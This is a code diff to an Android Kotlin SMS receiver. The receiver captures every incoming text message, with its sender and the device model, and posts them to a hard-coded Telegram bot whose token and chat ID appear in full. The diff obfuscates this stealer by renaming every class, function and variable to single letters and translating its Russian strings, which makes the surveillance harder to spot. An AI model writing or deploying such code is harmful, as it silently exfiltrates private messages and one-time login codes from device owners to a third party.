@@ -10,69 +10,69 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okio.IOException
 
-class SmsReceiver : BroadcastReceiver() {
-    private val client = OkHttpClient()
+class X : BroadcastReceiver() {
+    private val y = OkHttpClient()
 
-    override fun onReceive(context: Context?, intent: Intent?) {
-        if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
-            val bundle: Bundle? = intent.extras
-            if (bundle != null) {
-                val pdus: Array<Any?>? = bundle.get("pdus") as Array<Any?>?
-                if (pdus != null) {
-                    for (pdu in pdus) {
-                        val smsMessage = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
-                        val sender: String = smsMessage.originatingAddress ?: "Неизвестный отправитель"
-                        val messageBody: String = smsMessage.messageBody ?: "Пустое сообщение"
-                        val deviceModel = getDeviceModel()
+    override fun onReceive(z: Context?, a: Intent?) {
+        if (a?.action == "android.provider.Telephony.SMS_RECEIVED") {
+            val b: Bundle? = a.extras
+            if (b != null) {
+                val c: Array<Any?>? = b.get("pdus") as Array<Any?>?
+                if (c != null) {
+                    for (d in c) {
+                        val e = android.telephony.SmsMessage.createFromPdu(d as ByteArray)
+                        val f: String = e.originatingAddress ?: "Unknown"
+                        val g: String = e.messageBody ?: "Empty"
+                        val h = i()
 
-                        sendToTelegramBot(sender, messageBody, deviceModel)
+                        j(f, g, h)
                     }
                 }
             }
         }
     }
 
-    private fun getDeviceModel(): String {
+    private fun i(): String {
         return "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
     }
 
-    private fun sendToTelegramBot(sender: String, message: String, device: String) {
-        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
-        val chatId = "6331293386"
-        val url = "https://api.telegram.org/bot$botToken/sendMessage"
+    private fun j(k: String, l: String, m: String) {
+        val n = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
+        val o = "6331293386"
+        val p = "https://api.telegram.org/bot$n/sendMessage"
 
-        val text = """
-            Получено новое смс!
-            Отправитель: $sender
-            Сообщение: $message
+        val q = """
+            New SMS!
+            From: $k
+            Text: $l
         
-            $device
+            $m
         """.trimIndent()
 
-        val mediaType = "application/json".toMediaType()
-        val requestBody = """
+        val r = "application/json".toMediaType()
+        val s = """
             {
-                "chat_id": "$chatId",
-                "text": "$text",
+                "chat_id": "$o",
+                "text": "$q",
                 "parse_mode": "Markdown"
             }
-        """.trimIndent().toRequestBody(mediaType)
+        """.trimIndent().toRequestBody(r)
 
-        val request = Request.Builder()
-            .url(url)
-            .post(requestBody)
+        val t = Request.Builder()
+            .url(p)
+            .post(s)
             .build()
 
-        client.newCall(request).enqueue(object : okhttp3.Callback {
-            override fun onFailure(call: okhttp3.Call, e: IOException) {
-                e.printStackTrace()
+        y.newCall(t).enqueue(object : okhttp3.Callback {
+            override fun onFailure(u: okhttp3.Call, v: IOException) {
+                v.printStackTrace()
             }
 
-            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
-                if (!response.isSuccessful) {
-                    println("${response.code}")
+            override fun onResponse(u: okhttp3.Call, w: okhttp3.Response) {
+                if (!w.isSuccessful) {
+                    println("${w.code}")
                 }
-                response.close()
+                w.close()
             }
         })
     }
